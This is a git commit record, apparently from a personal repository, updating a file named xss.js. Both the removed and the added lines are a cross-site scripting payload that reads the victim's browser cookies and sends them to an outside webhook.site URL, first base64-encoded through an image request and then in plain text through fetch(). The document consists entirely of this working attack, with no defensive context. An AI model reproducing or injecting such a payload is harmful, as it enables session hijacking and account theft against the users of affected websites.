0975b8914d353a2081d9ae2fb09fd10c8825c6c9
0xph4ntom <97632965+0xph4ntom@users.noreply.github.com>
2025-08-08 17:37:21 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/cd8d8262-6cfc-4554-b2a9-4bf2ec95a4c7/?
-data='+btoa(document.cookie);
+fetch('https://webhook.site/cd8d8262-6cfc-4554-b2a9-4bf2ec95a4c7/?cookies=' + document.cookie)
+
